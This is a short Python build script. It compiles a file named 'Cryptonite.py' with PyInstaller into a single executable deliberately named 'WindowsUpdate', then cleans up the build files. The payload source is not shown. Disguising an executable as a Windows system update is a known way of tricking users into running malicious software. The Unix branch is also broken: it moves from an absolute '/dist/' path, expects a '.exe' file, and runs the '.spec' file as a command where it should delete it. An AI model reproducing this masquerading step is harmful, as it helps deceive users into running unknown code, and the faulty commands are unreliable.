import os

OS = os.name
PATH = os.path.abspath(".")
FILE = "WindowsUpdate"
os.system(f"pyinstaller --onefile Cryptonite.py --name WindowsUpdate")
if OS == "nt":
    os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q WindowsUpdate.spec")
else:
    os.system(f"mv /dist/{FILE}.exe ./")
    os.system(f"rm -r __pycache__")
    os.system(f"rm -r build")
    os.system(f"rm -r dist")
    os.system(f"{FILE}.spec")
